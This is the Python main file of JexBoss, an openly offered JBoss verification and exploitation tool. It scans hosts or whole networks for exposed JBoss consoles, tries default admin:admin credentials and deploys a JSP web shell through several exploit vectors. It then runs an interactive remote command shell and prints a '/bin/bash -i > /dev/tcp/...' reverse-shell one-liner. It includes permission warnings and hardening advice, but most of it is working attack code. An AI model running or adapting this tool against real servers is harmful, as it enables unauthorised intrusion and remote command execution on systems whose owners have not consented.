#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
JexBoss: Jboss verify and EXploitation Tool
https://github.com/joaomatosf/jexboss

Copyright 2013 João Filho Matos Figueiredo

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""
import textwrap
import traceback
import logging
import datetime
import signal
import _exploits
import _updates
from os import name, system
import os, sys
import shutil
from zipfile import ZipFile
from time import sleep
from random import randint
import argparse, socket
from sys import argv, exit, version_info
logging.captureWarnings(True)
FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
logging.basicConfig(filename='jexboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)

__author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
__version = "1.1.3"

RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'


def print_and_flush(message, same_line=False):
    if same_line:
        print (message),
    else:
        print (message)
    if not sys.stdout.isatty():
        sys.stdout.flush()


if version_info[0] == 2 and version_info[1] < 7:
    print_and_flush(RED1 + BOLD + "\n * You are using the Python version 2.6. The JexBoss requires version >= 2.7.\n"
                        "" + GREEN + "   Please install the Python version >= 2.7. \n\n"
                                     "   Example for CentOS using Software Collections scl:\n"
                                     "   # yum -y install centos-release-scl\n"
                                     "   # yum -y install python27\n"
                                     "   # scl enable python27 bash\n" + ENDC)
    logging.CRITICAL('Python version 2.6 is not supported.')
    exit(0)

try:
    import readline
    readline.parse_and_bind('set editing-mode vi')
except:
    logging.warning('Module readline not installed. The terminal will not support the arrow keys.', exc_info=traceback)
    print_and_flush(RED1 + "\n * Module readline not installed. The terminal will not support the arrow keys.\n" + ENDC)


try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

try:
    from urllib3.util import parse_url
    from urllib3 import PoolManager
    from urllib3 import ProxyManager
    from urllib3 import make_headers
    from urllib3.util import Timeout
except ImportError:
    print_and_flush(RED1 + BOLD + "\n * Package urllib3 not installed. Please install the dependencies before continue.\n"
                        "" + GREEN + "   Example: \n"
                                     "   # pip install -r requires.txt\n" + ENDC)
    logging.critical('Module urllib3 not installed. See details:', exc_info=traceback)
    exit(0)

try:
    import ipaddress
except:
    print_and_flush(RED1 + BOLD + "\n * Package ipaddress not installed. Please install the dependencies before continue.\n"
                        "" + GREEN + "   Example: \n"
                                     "   # pip install -r requires.txt\n" + ENDC)
    logging.critical('Module ipaddress not installed. See details:', exc_info=traceback)
    exit(0)

global gl_interrupted
gl_interrupted = False
global gl_args
global gl_http_pool


def get_random_user_agent():
    user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
                   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
                   "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
                   "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
                   "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]
    return user_agents[randint(0, len(user_agents) - 1)]


def is_proxy_ok():
    print_and_flush(GREEN + "\n ** Checking proxy: %s **\n\n" % gl_args.proxy)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    try:
        r = gl_http_pool.request('GET', gl_args.host, redirect=False, headers=headers)
    except:
        print_and_flush(RED + " * Error: Failed to connect to %s using proxy %s.\n"
                              "   See logs for more details...\n" %(gl_args.host,gl_args.proxy) + ENDC)
        logging.warning("Failed to connect to %s using proxy" %gl_args.host, exc_info=traceback)
        return False

    if r.status == 407:
        print_and_flush(RED + " * Error 407: Proxy authentication is required. \n"
                                      "   Please enter the correct login and password for authentication. \n"
                                      "   Example: -P http://proxy.com:3128 -L username:password\n" + ENDC)
        logging.error("Proxy authentication failed")
        return False

    elif r.status == 503 or r.status == 502:
        print_and_flush(RED + " * Error %s: The service %s is not availabel to your proxy. \n"
                              "   See logs for more details...\n" %(r.status,gl_args.host)+ENDC)
        logging.error("Service unavailable to your proxy")
        return False
    else:
        return True


def configure_http_pool():

    global gl_http_pool

    if gl_args.mode == 'auto-scan' or gl_args.mode == 'file-scan':
        timeout = Timeout(connect=1.0, read=3.0)
    else:
        timeout = Timeout(connect=gl_args.timeout, read=6.0)

    if gl_args.proxy:
        # when using proxy, protocol should be informed
        if 'http' not in gl_args.host or 'http' not in gl_args.proxy:
            print_and_flush(RED + " * When using proxy, you must specify the http or https protocol"
                                  " (eg. http://%s).\n\n" %(gl_args.host if 'http' not in gl_args.host else gl_args.proxy) +ENDC)
            logging.critical('Protocol not specified')
            exit(1)

        try:
            if gl_args.proxy_cred:
                headers = make_headers(proxy_basic_auth=gl_args.proxy_cred)
                gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, proxy_headers=headers, timeout=timeout, cert_reqs='CERT_NONE')
            else:
                gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE')
        except:
            print_and_flush(RED + " * An error occurred while setting the proxy. Please see log for details..\n\n" +ENDC)
            logging.critical('Error while setting the proxy', exc_info=traceback)
            exit(1)
    else:
        gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')


def handler_interrupt(signum, frame):
    global gl_interrupted
    gl_interrupted = True
    print_and_flush ("Interrupting execution ...")
    logging.info("Interrupting execution ...")
    exit(1)

signal.signal(signal.SIGINT, handler_interrupt)


def check_connectivity(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((str(host), int(port)))
        s.close()
    except socket.timeout:
        logging.info("Failed to connect to %s:%s" %(host,port))
        return False
    except:
        logging.info("Failed to connect to %s:%s" % (host, port))
        return False

    return True


def check_vul(url):
    """
    Test if a GET to a URL is successful
    :param url: The URL to test
    :return: A dict with the exploit type as the keys, and the HTTP status code as the value
    """
    url_check = parse_url(url)
    if '443' in str(url_check.port) and url_check.scheme != 'https':
        url = "https://"+str(url_check.host)+":"+str(url_check.port)

    print_and_flush(GREEN + "\n ** Checking Host: %s **\n" % url)
    logging.info("Checking Host: %s" % url)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
             "web-console": "/web-console/ServerInfo.jsp",
             "JMXInvokerServlet": "/invoker/JMXInvokerServlet",
             "admin-console": "/admin-console/"}
    fatal_error = False
    for i in paths.keys():
        if gl_interrupted: break
        try:
            r = gl_http_pool.request('HEAD', url + str(paths[i]), redirect=False, headers=headers)
            print_and_flush(GREEN + " * Checking %s: \t" % i + ENDC, same_line=True)
            paths[i] = r.status

            # check if the proxy do not support running in the same port of the target
            if r.status == 400 and gl_args.proxy:
                if parse_url(gl_args.proxy).port == url_check.port:
                    print_and_flush(RED + "[ ERROR ]\n * An error occurred because the proxy server is running on the "
                                       "same port as the server port (port %s).\n"
                                       "   Please use a different port in the proxy.\n" % url_check.port + ENDC)
                    logging.critical("Proxy returns 400 Bad Request because is running in the same port as the server")
                    fatal_error = True
                    break

            # check if it's false positive
            if len(r.getheaders()) == 0:
                print_and_flush(RED + "[ ERROR ]\n * The server %s is not an HTTP server.\n" % url + ENDC)
                logging.error("The server %s is not an HTTP server." % url)
                paths = {"jmx-console": 505,
                         "web-console": 505,
                         "JMXInvokerServlet": 505,
                         "admin-console": 505}
                break

            if paths[i] in (301, 302, 303, 307, 308):
                url_redirect = r.get_redirect_location()
                print_and_flush(GREEN + "[ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
            elif paths[i] == 200 or paths[i] == 500:
                if i == "admin-console":
                    print_and_flush(RED + "[ EXPOSED ]" + ENDC)
                    logging.info("Server %s: EXPOSED" %url)
                else:
                    print_and_flush(RED + "[ VULNERABLE ]" + ENDC)
                    logging.info("Server %s: VULNERABLE" % url)
            else:
                print_and_flush(GREEN + "[ OK ]")
        except:
            print_and_flush(RED + "\n * An error occurred while connecting to the host %s\n" % url + ENDC)
            logging.info("An error occurred while connecting to the host %s" % url, exc_info=traceback)
            paths[i] = 505

    if fatal_error:
        exit(1)
    else:
        return paths


def auto_exploit(url, exploit_type):
    """
    Automatically exploit a URL
    :param url: The URL to exploit
    :param exploit_type: One of the following
    exploitJmxConsoleFileRepository: tested and working in JBoss 4 and 5
    exploitJmxConsoleMainDeploy:	 tested and working in JBoss 4 and 6
    exploitWebConsoleInvoker:		 tested and working in JBoss 4
    exploitJMXInvokerFileRepository: tested and working in JBoss 4 and 5
    exploitAdminConsole: tested and working in JBoss 5 and 6 (with default password)
    """
    print_and_flush(GREEN + "\n * Sending exploit code to %s. Please wait...\n" % url)
    result = 505
    if exploit_type == "jmx-console":
        result = _exploits.exploit_jmx_console_file_repository(url)
        if result != 200 and result != 500:
            result = _exploits.exploit_jmx_console_main_deploy(url)
    elif exploit_type == "web-console":
        result = _exploits.exploit_web_console_invoker(url)
    elif exploit_type == "JMXInvokerServlet":
        result = _exploits.exploit_jmx_invoker_file_repository(url, 0)
        if result != 200 and result != 500:
            result = _exploits.exploit_jmx_invoker_file_repository(url, 1)
    elif exploit_type == "admin-console":
        result = _exploits.exploit_admin_console(url, gl_args.jboss_login)

    if result == 200 or result == 500:
        if not gl_args.auto_exploit:
            print_and_flush(GREEN + " * Successfully deployed code! Starting command shell. Please wait...\n" + ENDC)
            shell_http(url, exploit_type)
        else:
            print_and_flush(GREEN + " * Successfully deployed code via vector %s\n *** Run JexBoss in Standalone mode "
                                    "to open command shell. ***" %(exploit_type) + ENDC)
            return True
    else:
        print_and_flush(RED + "\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\n" +
                              "   Waiting for 7 seconds...\n " + ENDC)
        logging.error("Could not exploit the server %s automatically. HTTP Code: %s" %(url, result))
        if gl_args.mode == 'standalone':
            sleep(7)
            return False
        else:
            return False

# FIX: capture the readtimeout   File "jexboss.py", line 333, in shell_http
def shell_http(url, shell_type):
    """
    Connect to an HTTP shell
    :param url: The URL to connect to
    :param shell_type: The type of shell to connect to
    """
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    if gl_args.disable_check_updates:
        headers['no-check-updates'] = 'true'

    if shell_type == "jmx-console" or shell_type == "web-console" or shell_type == "admin-console":
        path = '/jexws4/jexws4.jsp?'
    elif shell_type == "JMXInvokerServlet":
        path = '/jexinv4/jexinv4.jsp?'

    gl_http_pool.request('GET', url+path, redirect=False, headers=headers)

    sleep(7)
    resp = ""
    print_and_flush("# ----------------------------------------- # LOL # ----------------------------------------- #\n")
    print_and_flush(RED + " * " + url + ": \n" + ENDC)
    print_and_flush("# ----------------------------------------- #\n")
    print_and_flush(GREEN + BOLD + " * For a Reverse Shell (like meterpreter =]), type the command: \n\n"
                                   "   jexremote=YOUR_IP:YOUR_PORT\n\n" + ENDC + GREEN +
                    "   Example:\n" +ENDC+
                    "     Shell>jexremote=192.168.0.10:4444\n"
                    "\n" +GREEN+
                    "   Or use other techniques of your choice, like:\n" +ENDC+
                    "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
                    "   \n"+GREEN+
                    "   And so on... =]\n" +ENDC
                    )
    print_and_flush("# ----------------------------------------- #\n")

    for cmd in ['uname -a', 'cat /etc/issue', 'id']:
        cmd = urlencode({"ppp": cmd})
        try:
            r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
            resp += " " + str(r.data).split(">")[1]
        except:
            print_and_flush(RED + " * Apparently an IPS is blocking some requests. Check for updates will be disabled...\n\n"+ENDC)
            logging.warning("Disabling checking for updates.", exc_info=traceback)
            headers['no-check-updates'] = 'true'

    print_and_flush(resp.replace('\\n', '\n'), same_line=True)
    logging.info("Server %s exploited!" %url)

    while 1:
        print_and_flush(BLUE + "[Type commands or \"exit\" to finish]" +ENDC)

        if not sys.stdout.isatty():
            print_and_flush("Shell> ", same_line=True)
            cmd = input() if version_info[0] >= 3 else raw_input()
        else:
            cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")

        if cmd == "exit":
            break

        cmd = urlencode({"ppp": cmd})
        try:
            r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
        except:
            print_and_flush(RED + " * Error contacting the command shell. Try again and see logs for details ...")
            logging.error("Error contacting the command shell", exc_info=traceback)
            continue

        resp = str(r.data)
        if r.status == 404:
            print_and_flush(RED + " * Error contacting the command shell. Try again later...")
            continue
        stdout = ""
        try:
            stdout = resp.split("pre>")[1]
        except:
            print_and_flush(RED + " * Error contacting the command shell. Try again later...")
        if stdout.count("An exception occurred processing JSP page") == 1:
            print_and_flush(RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + ENDC)
        else:
            print_and_flush(stdout.replace('\\n', '\n'))


def clear():
    """
    Clears the console
    """
    if name == 'posix':
        system('clear')
    elif name == ('ce', 'nt', 'dos'):
        system('cls')


def banner():
    """
    Print the banner
    """
    clear()
    print_and_flush(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
                 " |                                                      |\n"
                 " | @author:  João Filho Matos Figueiredo                |\n"
                 " | @contact: joaomatosf@gmail.com                       |\n"
                 " |                                                      |\n"
                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
                 " #______________________________________________________#\n")
    print_and_flush(RED1 + " @version: %s\n"%__version )

    print_and_flush (ENDC)


def help_usage():
    usage = (BOLD + BLUE + "\n Examples:" + ENDC +
    BLUE + "\n For simple usage, you must provide the host name or IP address you want to test:" +
    GREEN + "\n  $ python jexboss.py -host https://site.com.br" +
    BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, list of ports and filename for store results:" +
    GREEN + "\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log" +
    BLUE + "\n\n For file scan mode, you must provide the filename with host list to be scanned (one host per line)and filename for store results:" +
    GREEN + "\n  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log" + ENDC)
    return usage


def network_args(string):
    try:
        if version_info[0] >= 3:
            value = ipaddress.ip_network(string)
        else:
            value = ipaddress.ip_network(unicode(string))
    except:
        msg = "%s is not a network address in CIDR format." % string
        logging.error("%s is not a network address in CIDR format." % string)
        raise argparse.ArgumentTypeError(msg)
    return value


def main():
    """
    Run interactively. Call when the module is run by itself.
    :return: Exit code
    """
    # check for Updates
    if not gl_args.disable_check_updates:
        updates = _updates.check_updates()
        if updates:
            print_and_flush(BLUE + BOLD + "\n\n * An update is available and is recommended update before continuing.\n" +
                                          "   Do you want to update now?")
            if not sys.stdout.isatty():
                print_and_flush("   YES/no? ", same_line=True)
                pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
            else:
                pick = input("   YES/no? ").lower() if version_info[0] >= 3 else raw_input("   YES/no? ").lower()

            print_and_flush(ENDC)
            if pick != "no":
                updated = _updates.auto_update()
                if updated:
                    print_and_flush(GREEN + BOLD + "\n * The JexBoss has been successfully updated. Please run again to enjoy the updates.\n" +ENDC)
                    exit(0)
                else:
                    print_and_flush(RED + BOLD + "\n\n * An error occurred while updating the JexBoss. Please try again..\n" +ENDC)
                    exit(1)

    vulnerables = False
    # check vulnerabilities for standalone mode
    if gl_args.mode == 'standalone':
        url = gl_args.host
        scan_results = check_vul(url)
        # performs exploitation
        for i in ["jmx-console", "web-console", "JMXInvokerServlet", "admin-console"]:
            if scan_results[i] == 200 or scan_results[i] == 500:
                vulnerables = True
                if gl_args.auto_exploit:
                    auto_exploit(url, i)
                else:
                    print_and_flush(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
                          BOLD + i + NORMAL + "\" ?\n" +
                          "   This operation will provide a simple command shell to execute commands on the server..\n" +
                          RED + "   Continue only if you have permission!" + ENDC)
                    if not sys.stdout.isatty():
                        print_and_flush("   yes/NO? ", same_line=True)
                        pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
                    else:
                        pick = input("   yes/NO? ").lower() if version_info[0] >= 3 else raw_input("   yes/NO? ").lower()

                    if pick == "yes":
                        auto_exploit(url, i)
    # check vulnerabilities for auto scan mode
    elif gl_args.mode == 'auto-scan':
        file_results = open(gl_args.results, 'w')
        file_results.write("JexBoss Scan Mode Report\n\n")
        for ip in gl_args.network.hosts():
            if gl_interrupted: break
            for port in gl_args.ports.split(","):
                if check_connectivity(ip, port):
                    url = "{0}:{1}".format(ip,port)
                    ip_results = check_vul(url)
                    for key in ip_results.keys():
                        if ip_results[key] == 200 or ip_results[key] == 500:
                            vulnerables = True
                            if gl_args.auto_exploit:
                                result_exploit = auto_exploit(url, key)
                                if result_exploit:
                                    file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
                                else:
                                    file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
                            else:
                                file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))

                            file_results.flush()
                else:
                    print_and_flush (RED+"\n * Host %s:%s does not respond."% (ip,port)+ENDC)
        file_results.close()

    elif gl_args.mode == 'file-scan':
        file_results = open(gl_args.out, 'w')
        file_results.write("JexBoss Scan Mode Report\n\n")
        file_input = open(gl_args.file, 'r')
        for url in file_input.readlines():
            if gl_interrupted: break
            url = url.strip()
            ip = str(parse_url(url)[2])
            port = parse_url(url)[3] if parse_url(url)[3] != None else 80
            if check_connectivity(ip, port):
                url_results = check_vul(url)
                for key in url_results.keys():
                    if url_results[key] == 200 or url_results[key] == 500:
                        vulnerables = True
                        if gl_args.auto_exploit:
                            result_exploit = auto_exploit(url, key)
                            if result_exploit:
                                file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
                            else:
                                file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
                        else:
                            file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))

                        file_results.flush()
            else:
                print_and_flush (RED + "\n * Host %s:%s does not respond." % (ip, port) + ENDC)
        file_results.close()

    # resume results
    if vulnerables:
        banner()
        print_and_flush(RED + BOLD+" Results: potentially compromised server!" + ENDC)
        if gl_args.mode  == 'file-scan':
            print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.out) + ENDC)
        elif gl_args.mode == 'auto-scan':
            print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.results) + ENDC)
        print_and_flush(GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
             +BOLD+   " Recommendations: \n" +ENDC+
              GREEN+  " - Remove web consoles and services that are not used, eg:\n"
                      "    $ rm web-console.war\n"
                      "    $ rm http-invoker.sar\n"
                      "    $ rm jmx-console.war\n"
                      "    $ rm jmx-invoker-adaptor-server.sar\n"
                      "    $ rm admin-console.war\n"
                      " - Use a reverse proxy (eg. nginx, apache, F5)\n"
                      " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
                      " - Search vestiges of exploitation within the directories \"deploy\" and \"management\".\n\n"
                      " References:\n"
                      "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                      "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
                      "\n"
                      " - If possible, discard this server!\n"
                      " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
    else:
        print_and_flush(GREEN + "\n\n * Results: \n" +
              "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
    # infos
    print_and_flush(ENDC + " * Info: review, suggestions, updates, etc: \n" +
          "   https://github.com/joaomatosf/jexboss\n")

    print_and_flush(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n"
                                                "           including research to new versions of JBoss and zero days. \n\n" +
          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" +
          GREEN + BOLD + " * URI: " + ENDC + " bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss\n")


print_and_flush(ENDC)

#banner()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        #description="JexBoss v%s: JBoss verify and EXploitation Tool" %__version,
        description=textwrap.dedent(RED1 + "\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\n"
                 " |                                                      |\n"
                 " | @author:  João Filho Matos Figueiredo                |\n"
                 " | @contact: joaomatosf@gmail.com                       |\n"
                 " |                                                      |\n"
                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
                 " #______________________________________________________#\n"
                 " @version: "+__version+"\n"+ help_usage()),
        epilog="",
        prog="JexBoss"
    )

    group_standalone = parser.add_argument_group('Standalone mode')
    group_auto_scan = parser.add_argument_group('Auto scan mode')
    group_file_scan = parser.add_argument_group('File scan mode')

    parser.add_argument('--version', action='version', version='%(prog)s ' + __version)
    parser.add_argument("--auto-exploit", "-A",
                        help="Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!)",
                        action='store_true')
    parser.add_argument("--disable-check-updates", "-D", help="Disable two updates checks: 1) Check for updates "
                        "performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates "
                        "performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt",
                        action='store_true')
    parser.add_argument('-mode', help="Operation mode", choices=['standalone', 'auto-scan', 'file-scan'], default='standalone')
    parser.add_argument('--proxy', "-P", help="Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128)", )
    parser.add_argument('--proxy-cred', "-L", help="Proxy authentication credentials (eg -L name:password)", metavar='LOGIN:PASS')
    parser.add_argument('--jboss-login', "-J", help="JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 "
                                                    "(default: admin:admin)", metavar='LOGIN:PASS', default='admin:admin')
    parser.add_argument('--timeout', help="Seconds to wait before timeout connection (default 3)", default=3, type=int)
    #parser.add_argument('--retries', help="Retries when the connection timeouts (default 3)", default=3, type=int)

    group_standalone.add_argument("-host", "-u", help="Host address to be checked (eg. -u http://192.168.0.10:8080)",
                                  type=str)
    group_auto_scan.add_argument("-network", help="Network to be checked in CIDR format (eg. 10.0.0.0/8)",
                            type=network_args, default='192.168.0.0/24')
    group_auto_scan.add_argument("-ports", help="List of ports separated by commas to be checked for each host "
                                                "(eg. 8080,8443,8888,80,443)", type=str, default='8080,80')
    group_auto_scan.add_argument("-results", help="File name to store the auto scan results", type=str,
                                 metavar='FILENAME', default='jexboss_auto_scan_results.log')

    group_file_scan.add_argument("-file", help="Filename with host list to be scanned (one host per line)", type=str, metavar='FILENAME_HOSTS')
    group_file_scan.add_argument("-out", help="File name to store the file scan results", type=str, metavar='FILENAME_RESULTS', default='jexboss_file_scan_results.log')

    gl_args = parser.parse_args()

    if gl_args.mode == 'standalone' and gl_args.host == None or \
        gl_args.mode == 'file-scan' and gl_args.file == None:
        banner()
        exit(0)
    else:
        configure_http_pool()
        _updates.set_http_pool(gl_http_pool)
        _exploits.set_http_pool(gl_http_pool)
        banner()
        if gl_args.proxy and not is_proxy_ok():
            exit(1)
        main()
